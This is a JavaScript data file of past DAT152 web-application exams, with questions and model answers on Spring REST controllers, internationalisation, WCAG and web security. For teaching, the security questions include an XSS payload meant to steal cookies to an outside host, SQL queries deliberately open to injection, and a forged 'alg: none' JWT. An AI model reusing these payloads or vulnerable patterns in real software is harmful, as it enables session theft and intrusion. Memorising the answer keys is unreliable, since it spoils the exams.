/* Tidligere eksamener: v26, h25, h24.
   type: "text" = vanlig tekstfelt, "code" = kodeeditor. sol: html, "@nøkkel" (DAT.ans) eller liste av disse. */
window.DAT = window.DAT || {};
DAT.exams = DAT.exams || [];

DAT.exams.push({
  id: "v26", title: "Vår 2026", kind: "past", appendix: ["spring", "js"],
  questions: [
    { title: "Question 1 – Web Frameworks and Services", weight: 40,
      intro: `<div class="figure"><b>Student–Course model</b> (many-to-many)<br>
Student: <code>PK sid</code>, name, email … &nbsp;|&nbsp; Course: <code>PK cid</code>, code, name, semester …</div>
<p>A simple student-course web service where students can register a profile and manage their courses. Course management means that students can register for courses per semester, withdraw from courses, update courses, view all registered courses, and view a course detail. A student can register for many courses and many students can be registered to a course.</p>`,
      tasks: [
        { label: "a", type: "text", q: `<p><b>REST Maturity:</b> Discuss briefly the different levels of Richardson Maturity Model (RMM) for defining the maturity of REST APIs.</p>`, sol: "@rmm" },
        { label: "b", type: "code", lang: "text", q: `<p>Build REST API endpoints for this service. The REST API should provide the following services for students:</p>
<ul><li>Register/create a profile</li><li>View details about own profile</li><li>Update profile information</li><li>Register for a new course</li><li>Withdraw from a course</li><li>List all registered courses</li><li>View details of a registered course</li></ul>
<p>Use the table structure below (example in the first row). You can have up to four levels (e.g. collection/identifier/collection/identifier).</p>`,
          starter: "Service | API Method | Endpoint (URI) | HTTP Method\nGet or view details about a student | getStudentProfile | students/{sid} | GET\n",
          sol: `<table><tr><th>Service</th><th>API Method</th><th>Endpoint</th><th>HTTP</th></tr>
<tr><td>Register/create a profile</td><td>createStudent</td><td>/students</td><td>POST</td></tr>
<tr><td>View own profile</td><td>getStudentProfile</td><td>/students/{sid}</td><td>GET</td></tr>
<tr><td>Update profile</td><td>updateStudent</td><td>/students/{sid}</td><td>PUT</td></tr>
<tr><td>Register for a new course</td><td>registerCourse</td><td>/students/{sid}/courses</td><td>POST</td></tr>
<tr><td>Withdraw from a course</td><td>withdrawCourse</td><td>/students/{sid}/courses/{cid}</td><td>DELETE</td></tr>
<tr><td>List all registered courses</td><td>getCourses</td><td>/students/{sid}/courses</td><td>GET</td></tr>
<tr><td>View a registered course</td><td>getCourse</td><td>/students/{sid}/courses/{cid}</td><td>GET</td></tr></table>` },
        { label: "c", type: "code", lang: "java", q: `<p>Assume the StudentService class is implemented in Spring Framework with the following methods (the method name, parameters and return types are sufficient to infer the behaviour):</p>
~~~java
public class StudentService {
    public Student saveStudent(Student student) {...}
    public Student findById(Long sid) {...}
    public Student updateStudent(Student student, Long sid) {...}
    public Set<Course> saveCourse(Long sid, Course course) {...}   // returns all courses incl. the new
    public Set<Course> findCourses(Long sid) {...}
    public Course findCourse(Long sid, Long cid) {...}
    public Set<Course> deleteCourse(Long sid, Long cid) {...}      // returns remaining courses
}
~~~
<p>Implement the controller class and the methods for all the Student REST API endpoints that you identified in b). Your methods must return the appropriate HttpStatus code. You can assume two exceptions – <code>StudentNotFoundException</code> and <code>CourseNotFoundException</code>.</p>`,
          starter: `@RestController
@RequestMapping("/studapp/api/v1")
public class StudentController {

    // Write your controller methods here

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/studapp/api/v1")
public class StudentController {

    @Autowired
    private StudentService studentService;

    @PostMapping("/students")
    public ResponseEntity<Object> createStudent(@RequestBody Student student) {
        Student nstudent = studentService.saveStudent(student);
        return new ResponseEntity<>(nstudent, HttpStatus.CREATED);
    }

    @GetMapping("/students/{sid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> getStudentProfile(@PathVariable("sid") Long sid)
            throws StudentNotFoundException {
        Student student = studentService.findById(sid);
        return new ResponseEntity<>(student, HttpStatus.OK);
    }

    @PutMapping("/students/{sid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> updateStudent(@RequestBody Student student,
            @PathVariable("sid") Long sid) throws StudentNotFoundException {
        Student ustudent = studentService.updateStudent(student, sid);
        return new ResponseEntity<>(ustudent, HttpStatus.OK);
    }

    @PostMapping("/students/{sid}/courses")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> registerCourse(@PathVariable("sid") Long sid,
            @RequestBody Course course) throws StudentNotFoundException {
        Set<Course> courses = studentService.saveCourse(sid, course);
        return new ResponseEntity<>(courses, HttpStatus.CREATED);
    }

    @GetMapping("/students/{sid}/courses")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> getCourses(@PathVariable("sid") Long sid)
            throws StudentNotFoundException {
        Set<Course> courses = studentService.findCourses(sid);
        if (courses.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(courses, HttpStatus.OK);
    }

    @GetMapping("/students/{sid}/courses/{cid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> getCourse(@PathVariable("sid") Long sid,
            @PathVariable("cid") Long cid)
            throws StudentNotFoundException, CourseNotFoundException {
        Course course = studentService.findCourse(sid, cid);
        return new ResponseEntity<>(course, HttpStatus.OK);
    }

    @DeleteMapping("/students/{sid}/courses/{cid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
    public ResponseEntity<Object> withdrawCourse(@PathVariable("sid") Long sid,
            @PathVariable("cid") Long cid)
            throws StudentNotFoundException, CourseNotFoundException {
        Set<Course> courses = studentService.deleteCourse(sid, cid);
        return new ResponseEntity<>(courses, HttpStatus.OK);
    }
}
~~~
<p class="small">@PreAuthorize-linjene hører til oppgave d II.</p>` },
        { label: "d I", type: "text", q: `<p>Assume the studapp service is using a 3rd party identity provider (IdP) for its users based on the OAuth2 protocol.</p><p>What is the difference between the Authorization code flow and the Implicit grant flow?</p>`, sol: "@codeVsImplicit" },
        { label: "d II", type: "code", lang: "java", q: `<p>Assume there are two roles 'ADMIN' and 'USER' in the JWT access token, where ADMIN is assigned to the staff and USER to the students. Protect the REST API endpoints in StudentController using relevant Spring annotations and the authentication object. The student's id can be accessed as <code>authentication.details.sid</code>.</p>
<ol><li>An authenticated student can only access own courses</li><li>Staff must be able to access courses of any student</li></ol>
<p>Update your controller methods with the appropriate roles and Spring authorization annotations.</p>`,
          starter: `@RestController
@RequestMapping("/studapp/api/v1")
public class StudentController {
    // update your controller methods with the appropriate
    // roles and Spring authorization annotations
}
`,
          sol: `<p>Every endpoint for a student's own data/courses gets:</p>
~~~java
@PreAuthorize("hasAuthority('ADMIN') or authentication.details.sid == #sid")
~~~
<p><code>#sid</code> is the path variable. ADMIN (staff) can access all students; a USER only when the sid in the URL is his own sid. Creating a profile (POST /students) can be open (or <code>hasAnyAuthority('ADMIN','USER')</code>). See full code in c). Method security must be enabled with <code>@EnableMethodSecurity</code>.</p>` }
      ]},
    { title: "Question 2 – Globalization", weight: 10, tasks: [
        { label: "a", type: "text", q: `<p>In your own words, briefly explain what globalization, internationalization, and localization are.</p>`, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>As a developer, you have received a task to internationalize the 1-page web application below. Create the resource bundles (property files) for English and any other language of your choice.</p>
<div class="figure mock"><h3 style="margin:0 0 8px">Welcome to e-Library (Spring MVC)</h3><p><a>EN</a> | <a>NO</a></p><p><b>Hello</b> anonymousUser! &nbsp; <button type="button" disabled>Log out</button></p><p><a>View Books</a> | <a>Add Books</a> | <a>Add Author</a></p></div>`,
          starter: "# messages_en.properties\n\n\n# messages_no.properties\n",
          sol: `~~~properties
# messages_en.properties
welcome.title=Welcome to e-Library (Spring MVC)
lang.en=EN
lang.no=NO
welcome.hello=Hello {0}!
button.logout=Log out
link.viewbooks=View Books
link.addbooks=Add Books
link.addauthor=Add Author

# messages_no.properties
welcome.title=Velkommen til e-Bibliotek (Spring MVC)
lang.en=EN
lang.no=NO
welcome.hello=Hei {0}!
button.logout=Logg ut
link.viewbooks=Vis bøker
link.addbooks=Legg til bøker
link.addauthor=Legg til forfatter
~~~
<p class="small">Brukernavnet er en parameter <code>{0}</code>, ikke en del av teksten.</p>` }
      ]},
    { title: "Question 3 – Universal Design", weight: 5, tasks: [
        { label: "a", type: "text", q: `<p>What is Web Content Accessibility Guidelines (WCAG)?</p>`, sol: "@wcag" },
        { label: "b", type: "text", q: `<p>Briefly discuss the WCAG principle #1 – "Perceivable" and the guidelines for this principle.</p>`, sol: "@perceivable" }
      ]},
    { title: "Question 4 – Web security", weight: 25, tasks: [
        { label: "a", type: "code", lang: "java", q: `<p>Given the SQL query below where the username and password are user supplied data:</p>
~~~java
String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = " + username + " and PASSWORD = " + password;
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.executeUpdate();
~~~
<p>I) Briefly explain why this SQL query can be vulnerable to injection.<br>II) Mitigate the SQL injection vulnerability by writing the mitigation code.</p>`, sol: ["@sqliWhy", "@sqliFix"] },
        { label: "b", type: "text", q: `<p>A JSON Web Token (JWT) consists of three parts: Header.Claims.Signature</p><p>I) Describe the two different ways to calculate the signature part.<br>II) Assume the JWT is signed with the secret key "sentrum". Discuss the major threat to this token.</p>`, sol: ["@jwtSig", "@jwtWeak"] },
        { label: "c", type: "text", q: `<p>Passwords can be stored securely by using 1) cryptographically secure hash, 2) slow hash algorithm, 3) unique per user salt, and 4) pepper. Explain the security benefits of using these four password storage features.</p>`, sol: "@pw4" },
        { label: "d", type: "text", q: `<p>You inspect the HTML source of an online blog at https://gossip.blog.com and find the following included in one user's comment:</p>
~~~html
<script>document.write(\`<img src='' onerror='http://justpassingby.com/?'document.cookie/>\`);</script>
~~~
<p>Explain the types of vulnerability in this attack scenario.</p>`, sol: "@xssScenario" },
        { label: "e", type: "text", q: `<p>Describe briefly how the 'trust' relationship between an identity provider and a service provider is established.</p>`, sol: "@trust" },
        { label: "f", type: "text", q: `<p>What assumptions or conditions are necessary for an attacker to exploit a Cross Site Request Forgery (CSRF) vulnerability in a web application?</p>`, sol: "@csrfConditions" }
      ]},
    { title: "Question 5 – JavaScript", weight: 20, tasks: [
        { label: "a (2%)", type: "code", lang: "javascript", q: `<p>A JavaScript main thread should create a worker thread that produces a text "Welcome to DAT152". The main thread should then display the text in the browser console. Write JavaScript code for both the main thread and the worker thread.</p>`, starter: "// main.js\n\n\n// worker.js\n", sol: "@workerCode" },
        { label: "b (2%)", type: "code", lang: "javascript", q: `<p>Write the code of a Promise that is resolved by asynchronous code.</p>`, sol: "@promiseCode" },
        { label: "c (2%)", type: "text", q: `<p>The browser is running asynchronously a piece of JavaScript code that is blocking. How does this affect the browser and the application? You must explain your answer.</p>`, sol: "@blocking" },
        { label: "d (2%)", type: "text", q: `<p>What is the maximum number of concurrent threads that can access the DOM? You must explain why this is the maximum number to get any credits on this task.</p>`, sol: "@domThreads" },
        { label: "e (2%)", type: "text", q: `<p>JavaScript and routing:</p><p>i. What is meant by routing in the context of a single page application (SPA)? Why do we need routing?<br>ii. What approaches can be used to implement routing in plain JavaScript, i.e. no use of external libraries or frameworks?</p>`, sol: "@routing" },
        { label: "f (10%)", type: "code", lang: "javascript",
          q: `<p>Write JavaScript code for a quiz application. It is made up of a GUI component <b>QuizTool</b> and a server side with a database of questions with answers.</p>
<div class="figure mock"><fieldset><legend>Question 1 of 30</legend><p>Question:</p><p>What is the name of the highest mountain in Norway?</p><p>Answer: <input type="text" disabled></p><button type="button" disabled>Check answer</button> <button type="button" disabled>Next question</button></fieldset></div>
<p>The first question is fetched from the web server when the application is started. The component must also display the current question number and total count of questions (1 and 30 above). You are not asked to implement the Check answer button.</p>
<p>When the user clicks <b>Next question</b>: any previous answer is cleared from the view; the next question is fetched from the server and displayed; the question number is increased by one and updated in the view.</p>
<p><b>Endpoints:</b></p>
<ul><li><code>GET ../api/count</code> – returns the number of questions: <code>{ "count": 30, "responseStatus": true }</code></li>
<li><code>GET ../api/next?id={id}</code> – returns the first question with id bigger than the given id. <code>../api/next?id=0</code> gives the first question. Ids may not be consecutive. Example: <code>{ "question": { "id": 7, "text": "What is the name of the highest mountain in Norway?" }, "responseStatus": true }</code></li>
<li><code>GET ../api/check?id={id}&amp;answer={answer}</code> – you can ignore this.</li></ul>
<p>responseStatus is true if the request was understood and a result was found. Code to fetch the count can look like:</p>
~~~javascript
try {
    const response = await fetch("../api/count", {method: "GET"});
    try {
        const countResponse = await response.json();
        /* Your code that updates the view */
    } catch (error) { /* Your code */ }
} catch (error) { /* Your code */ } finally { /* Your code */ }
~~~
<p><b>Task:</b> Add code to QuizTool that fetches a question and displays it when the component is mounted and on a click on Next question, and displays the question number and count of questions.</p>`,
          starter: `const template = document.createElement("template");
template.innerHTML = \`
    <fieldset id="top">
        <legend>
            Question <span id="number"></span> of
            <span id="count"></span>
        </legend>
        <div id="question">
            <p>Question:</p>
            <p></p>
        </div>
        <form>
            <div id="answerbox">
                <!-- HTML code that you can ignore -->
            </div>
            <div id="buttons">
                <button type="button">Check answer</button>
                <button type="button">Next question</button>
            </div>
        </form>
    </fieldset>\`;

class QuizTool extends HTMLElement {
    #shadow;
    #serviceurl;
    // More fields

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        this.#shadow.appendChild(content);
        // More code
    }

    // More methods
}
customElements.define('dat152-quiz', QuizTool);
`,
          sol: `~~~javascript
class QuizTool extends HTMLElement {
    #shadow;
    #serviceurl = "../api";
    #questionId = 0;
    #number = 0;
    #numberElm;
    #countElm;
    #questionElm;
    #form;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        this.#shadow.appendChild(content);

        this.#numberElm = this.#shadow.getElementById("number");
        this.#countElm = this.#shadow.getElementById("count");
        this.#questionElm = this.#shadow.querySelector("#question p:last-of-type");
        this.#form = this.#shadow.querySelector("form");
        const buttons = this.#shadow.querySelectorAll("#buttons button");
        buttons[1].addEventListener("click", () => this.#nextQuestion());
    }

    connectedCallback() {
        this.#fetchCount();
        this.#nextQuestion();
    }

    async #fetchCount() {
        try {
            const response = await fetch(\`\${this.#serviceurl}/count\`, { method: "GET" });
            const countResponse = await response.json();
            if (countResponse.responseStatus) {
                this.#countElm.textContent = countResponse.count;
            }
        } catch (error) {
            console.log(error.message);
        }
    }

    async #nextQuestion() {
        try {
            const url = \`\${this.#serviceurl}/next?id=\${this.#questionId}\`;
            const response = await fetch(url, { method: "GET" });
            const result = await response.json();
            if (result.responseStatus) {
                this.#form.reset();                       // clear previous answer
                this.#questionId = result.question.id;    // next fetch uses this id
                this.#questionElm.textContent = result.question.text;
                this.#number++;
                this.#numberElm.textContent = this.#number;
            }
        } catch (error) {
            console.log(error.message);
        }
    }
}
customElements.define('dat152-quiz', QuizTool);
~~~` }
      ]}
  ]
});

DAT.exams.push({
  id: "h25", title: "Høst 2025", kind: "past", appendix: ["spring", "js"],
  questions: [
    { title: "Question 1 – Web Frameworks and Services", weight: 40,
      intro: `<div class="figure"><b>Shopping cart model</b><br>
Customer: <code>PK cid</code>, cname, address &nbsp;|&nbsp; Order: <code>PK id</code>, <code>FK cid</code>, <code>FK pid</code>, quantity, total_price, date &nbsp;|&nbsp; Product: <code>PK pid</code>, pname, description, price, quantity</div>
<p>A simple customer–product model for an e-shop REST service. A customer can purchase many products (one-to-many between customer and order) and a product can be purchased by many customers. A product is available in stock. For every order, the price is computed from the product's price and the quantity ordered, and the product's quantity is reduced globally. Customers can create a profile, update their information, make orders, list their orders, update and delete orders. Shop admin staff can list all customers, create, update or delete products.</p>`,
      tasks: [
        { label: "a", type: "text", q: `<p><b>CSR vs. SSR:</b> Compare the performance of CSR and SSR using the following metrics: 1) Initial Page Load Time 2) Subsequent Page Load Time 3) Throughput, and 4) Bandwidth.</p>`, sol: "@csrssr" },
        { label: "b", type: "code", lang: "text", q: `<p>Build REST API endpoints for this service:</p>
<p><b>Customer:</b> i. Register/create a profile; ii. View details about own profile; iii. Update profile information; iv. Make an order for a product (only if product is in stock; set the order price based on quantity; reduce the product's quantity); v. Update an order; vi. List all orders; vii. View a selected order.</p>
<p><b>Staff:</b> i. List all customers; ii. Create new products; iii. Update a product; iv. Delete a product; v. List all products; vi. View a product.</p>`,
          starter: "Service | API Method | Endpoint (URI) | HTTP Method\nGet or view details about a customer | getCustomer | customers/{cid} | GET\n",
          sol: `<table><tr><th>Service</th><th>API Method</th><th>Endpoint</th><th>HTTP</th></tr>
<tr><td>Create profile</td><td>createCustomer</td><td>/customers</td><td>POST</td></tr>
<tr><td>View own profile</td><td>getCustomer</td><td>/customers/{cid}</td><td>GET</td></tr>
<tr><td>Update profile</td><td>updateCustomer</td><td>/customers/{cid}</td><td>PUT</td></tr>
<tr><td>Make an order</td><td>createOrder</td><td>/customers/{cid}/orders</td><td>POST</td></tr>
<tr><td>Update an order</td><td>updateOrder</td><td>/customers/{cid}/orders/{oid}</td><td>PUT</td></tr>
<tr><td>List all orders</td><td>getOrders</td><td>/customers/{cid}/orders</td><td>GET</td></tr>
<tr><td>View an order</td><td>getOrder</td><td>/customers/{cid}/orders/{oid}</td><td>GET</td></tr>
<tr><td>(Delete an order)</td><td>deleteOrder</td><td>/customers/{cid}/orders/{oid}</td><td>DELETE</td></tr>
<tr><td>Staff: list customers</td><td>getCustomers</td><td>/customers</td><td>GET</td></tr>
<tr><td>Staff: create product</td><td>createProduct</td><td>/products</td><td>POST</td></tr>
<tr><td>Staff: update product</td><td>updateProduct</td><td>/products/{pid}</td><td>PUT</td></tr>
<tr><td>Staff: delete product</td><td>deleteProduct</td><td>/products/{pid}</td><td>DELETE</td></tr>
<tr><td>Staff: list products</td><td>getProducts</td><td>/products</td><td>GET</td></tr>
<tr><td>Staff: view product</td><td>getProduct</td><td>/products/{pid}</td><td>GET</td></tr></table>` },
        { label: "c I", type: "code", lang: "java", q: `<p>Assume the CustomerService and ProductService classes are implemented with these methods:</p>
~~~java
public class CustomerService {
    public Customer saveCustomer(Customer customer) {...}
    public List<Customer> findAll() {...}
    public Customer findById(Long cid) {...}
    public Customer updateCustomer(Customer customer, Long cid) {...}
    public Set<Order> saveOrder(Long cid, Order order) {...}      // incl. the new order
    public Set<Order> findOrders(Long cid) {...}
    public Order findOrder(Long cid, Long oid) {...}
    public Set<Order> deleteOrder(Long cid, Long oid) {...}       // remaining orders
}
public class ProductService {
    public Product saveProduct(Product product) {...}
    public Product updateProduct(Product product, Long pid) {...}
    public List<Product> findAll() {...}
    public void deleteById(Long pid) {...}
    public Product findProductById(Long pid) {...}
    public Product findByPname(String pname) {...}
}
~~~
<p>Implement the controller class and methods for all the <b>Customer</b> REST API endpoints from b). Return appropriate HttpStatus codes. You can use <code>CustomerNotFoundException</code>, <code>ProductNotFoundException</code> and <code>OrderNotFoundException</code>.</p>`,
          starter: `@RestController
@RequestMapping("/shopapp/api/v1")
public class CustomerController {

    // Write your controller methods here

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/shopapp/api/v1")
public class CustomerController {

    @Autowired
    private CustomerService customerService;
    @Autowired
    private ProductService productService;

    @PostMapping("/customers")
    public ResponseEntity<Object> createCustomer(@RequestBody Customer customer) {
        Customer ncustomer = customerService.saveCustomer(customer);
        return new ResponseEntity<>(ncustomer, HttpStatus.CREATED);
    }

    @GetMapping("/customers")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getCustomers() {
        List<Customer> customers = customerService.findAll();
        if (customers.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(customers, HttpStatus.OK);
    }

    @GetMapping("/customers/{cid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> getCustomer(@PathVariable("cid") Long cid)
            throws CustomerNotFoundException {
        return new ResponseEntity<>(customerService.findById(cid), HttpStatus.OK);
    }

    @PutMapping("/customers/{cid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> updateCustomer(@RequestBody Customer customer,
            @PathVariable("cid") Long cid) throws CustomerNotFoundException {
        return new ResponseEntity<>(customerService.updateCustomer(customer, cid), HttpStatus.OK);
    }

    @PostMapping("/customers/{cid}/orders")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> createOrder(@PathVariable("cid") Long cid,
            @RequestBody Order order)
            throws CustomerNotFoundException, ProductNotFoundException {
        Product product = productService.findProductById(order.getPid());
        // 1. only if product is in stock
        if (product.getQuantity() < order.getQuantity())
            return new ResponseEntity<>(HttpStatus.BAD_REQUEST);
        // 2. set the order price
        order.setTotal_price(product.getPrice() * order.getQuantity());
        // 3. reduce the product quantity
        product.setQuantity(product.getQuantity() - order.getQuantity());
        productService.updateProduct(product, product.getPid());

        Set<Order> orders = customerService.saveOrder(cid, order);
        return new ResponseEntity<>(orders, HttpStatus.CREATED);
    }

    @PutMapping("/customers/{cid}/orders/{oid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> updateOrder(@PathVariable("cid") Long cid,
            @PathVariable("oid") Long oid, @RequestBody Order order)
            throws CustomerNotFoundException, OrderNotFoundException {
        customerService.findOrder(cid, oid);       // throws if not found
        order.setId(oid);
        Set<Order> orders = customerService.saveOrder(cid, order);
        return new ResponseEntity<>(orders, HttpStatus.OK);
    }

    @GetMapping("/customers/{cid}/orders")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> getOrders(@PathVariable("cid") Long cid)
            throws CustomerNotFoundException {
        Set<Order> orders = customerService.findOrders(cid);
        if (orders.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(orders, HttpStatus.OK);
    }

    @GetMapping("/customers/{cid}/orders/{oid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> getOrder(@PathVariable("cid") Long cid,
            @PathVariable("oid") Long oid)
            throws CustomerNotFoundException, OrderNotFoundException {
        return new ResponseEntity<>(customerService.findOrder(cid, oid), HttpStatus.OK);
    }

    @DeleteMapping("/customers/{cid}/orders/{oid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> deleteOrder(@PathVariable("cid") Long cid,
            @PathVariable("oid") Long oid)
            throws CustomerNotFoundException, OrderNotFoundException {
        return new ResponseEntity<>(customerService.deleteOrder(cid, oid), HttpStatus.OK);
    }
}
~~~` },
        { label: "c II", type: "code", lang: "java", q: `<p>Implement the controller class and methods for the <b>Product</b> REST API endpoints from b).</p>`,
          starter: `@RestController
@RequestMapping("/shopapp/api/v1")
public class ProductController {

    // Write your controller methods here

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/shopapp/api/v1")
public class ProductController {

    @Autowired
    private ProductService productService;

    @GetMapping("/products")
    @PreAuthorize("hasAnyAuthority('ADMIN','USER')")
    public ResponseEntity<Object> getProducts() {
        List<Product> products = productService.findAll();
        if (products.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(products, HttpStatus.OK);
    }

    @GetMapping("/products/{pid}")
    @PreAuthorize("hasAnyAuthority('ADMIN','USER')")
    public ResponseEntity<Object> getProduct(@PathVariable("pid") Long pid)
            throws ProductNotFoundException {
        return new ResponseEntity<>(productService.findProductById(pid), HttpStatus.OK);
    }

    @PostMapping("/products")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> createProduct(@RequestBody Product product) {
        return new ResponseEntity<>(productService.saveProduct(product), HttpStatus.CREATED);
    }

    @PutMapping("/products/{pid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> updateProduct(@RequestBody Product product,
            @PathVariable("pid") Long pid) throws ProductNotFoundException {
        return new ResponseEntity<>(productService.updateProduct(product, pid), HttpStatus.OK);
    }

    @DeleteMapping("/products/{pid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> deleteProduct(@PathVariable("pid") Long pid)
            throws ProductNotFoundException {
        productService.deleteById(pid);
        return new ResponseEntity<>(HttpStatus.OK);
    }
}
~~~` },
        { label: "d I", type: "text", q: `<p>Assume the shopapp service is using a 3rd party identity provider (IdP) based on OAuth2. What is the difference between the Authorization code flow and the Implicit grant flow?</p>`, sol: "@codeVsImplicit" },
        { label: "d II", type: "code", lang: "java", q: `<p>Roles in the JWT: ADMIN (staff) and USER (customers). The customer id can be accessed as <code>authentication.details.cid</code>. Protect the endpoints in CustomerController and ProductController with Spring annotations:</p><ol><li>An authenticated customer can only access own orders</li><li>Staff must be able to access orders of any customer</li></ol>`,
          starter: "// CustomerController and ProductController with authorization annotations\n",
          sol: `<p>See the @PreAuthorize annotations in c I and c II:</p>
~~~java
// customer's own resources
@PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
// staff only (list customers, create/update/delete products)
@PreAuthorize("hasAuthority('ADMIN')")
// both (list/view products)
@PreAuthorize("hasAnyAuthority('ADMIN','USER')")
~~~` }
      ]},
    { title: "Question 2 – Globalization", weight: 10, tasks: [
        { label: "a", type: "text", q: `<p>In your own words, briefly explain what globalization, internationalization, and localization are.</p>`, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>Internationalize the 1-page web application below. Create the resource bundles (property files) for English and any other language of your choice.</p>
<div class="figure mock"><h2 style="margin:0">DAT152 Advanced Web Applications</h2><p><b>Date: 15/12/2025</b></p><p>This course has between 50 and 100 registered students</p>
<table style="width:auto"><tr><th colspan="2">Course Details</th></tr><tr><td>Course Code</td><td>DAT152</td></tr><tr><td>Course Name</td><td>Advanced Web Applications</td></tr><tr><td>Semester</td><td>Autumn</td></tr><tr><td>Lecturers</td><td>Bjarte Kileng and Tosin Daniel Oyetoyan</td></tr></table><a>Course Description</a></div>`,
          starter: "# messages_en.properties\n\n\n# messages_no.properties\n",
          sol: `~~~properties
# messages_en.properties
page.title=DAT152 Advanced Web Applications
page.date=Date: {0}
page.students=This course has between {0} and {1} registered students
details.header=Course Details
details.code=Course Code
details.name=Course Name
details.semester=Semester
details.lecturers=Lecturers
course.name=Advanced Web Applications
course.semester=Autumn
course.lecturers={0} and {1}
link.description=Course Description

# messages_no.properties
page.title=DAT152 Avanserte webapplikasjoner
page.date=Dato: {0}
page.students=Dette emnet har mellom {0} og {1} registrerte studenter
details.header=Emnedetaljer
details.code=Emnekode
details.name=Emnenavn
details.semester=Semester
details.lecturers=Forelesere
course.name=Avanserte webapplikasjoner
course.semester=Høst
course.lecturers={0} og {1}
link.description=Emnebeskrivelse
~~~
<p class="small">Dato og tall er parametere ({0}, {1}) slik at de kan formateres per språk.</p>` }
      ]},
    { title: "Question 3 – Universal Design", weight: 5, tasks: [
        { label: "a", type: "text", q: `<p>What is Universal Design?</p>`, sol: "@ud" },
        { label: "b", type: "text", q: `<p>Give 3 principles of UD.</p>`, sol: "@ud3" },
        { label: "c", type: "text", q: `<p>Briefly discuss the WCAG principle #2 – "Operable" and the guidelines for this principle.</p>`, sol: "@operable" }
      ]},
    { title: "Question 4 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>What is the difference between dynamic application security testing (DAST) and static application security testing (SAST)?</p>`, sol: "@sastDast" },
        { label: "b", type: "text", q: `<p>Passwords can be stored securely by using 1) cryptographically secure hash, 2) slow hash algorithm, 3) unique per user salt, and 4) pepper. Explain the security benefits of using these four password storage features.</p>`, sol: "@pw4" },
        { label: "c", type: "text", q: `<p>What are the secure ways to protect session cookies stored in a web browser storage from XSS vulnerability and session hijacking attack?</p>`, sol: "@cookieProtect" },
        { label: "d", type: "code", lang: "java", q: `<p>The search history of a user (from oblig 4) can be sorted by 'Date' or 'Search Word'. The method that handles the sorting is vulnerable to SQL injection:</p>
~~~java
public List<SearchItem> getSearchHistoryForUser(String username, String sortkey) {
    String sql = "SELECT * FROM SecOblig.History "
        + "WHERE username = '" + username
        + "' ORDER BY " + sortkey + " ASC";
    return getSearchItemList(sql, 50);
}
~~~
<p>Schema of SecOblig.History: <code>datetime TIMESTAMP</code>, <code>username VARCHAR(50)</code>, <code>searchkey VARCHAR(50)</code>. datetime maps to 'Date' and searchkey to 'Search Word'.</p><p>Write a mitigation for this SQL injection vulnerability.</p>`, sol: "@sqliOrderBy" },
        { label: "e", type: "text", q: `<p>What assumptions or conditions are necessary for an attacker to exploit a Cross Site Request Forgery (CSRF) vulnerability in a web application?</p>`, sol: "@csrfConditions" },
        { label: "f", type: "text", q: `<p>The jjwt-api library from Oblig4 has two methods for parsing a JWT: <code>parse(token)</code> and <code>parseClaimsJws(token)</code>. The JWT has been modified by changing the role from USER to ADMIN:</p>
<p><b>JWT #1</b> – header <code>{"alg": "none"}</code>, payload <code>{"iat": 1730803010, "role": "ADMIN", "user": "Bob"}</code>, encoded: <code>eyJhbGciOiJub25l….eyJleHAiOjE2OTg5….</code> (signature removed)</p>
<p><b>JWT #2</b> – header <code>{"alg": "RS256"}</code>, same payload, encoded with the old signature: <code>eyJhbGciOiJSUzI1NiIs….eyJleHAiOjE2OTr7….KMUFsIDTnFmyG3nM…</code></p>
~~~java
1.  try {
2.      Jwt jwt = Jwts.parser().setSigningKey(KEY).parse(accessToken);
3.      Claims claims = (Claims) jwt.getBody();
4.      String user = (String) claims.get("user");
5.      String role = (String) claims.get("role");
6.      if (role.equals("ADMIN")) {
7.          deleteAllUsers();
8.      } else {
9.          log.error("You are not an admin user");
10.     }
11. } catch (JwtException e) {
12.     throw new InvalidTokenException(e);
13. }
~~~
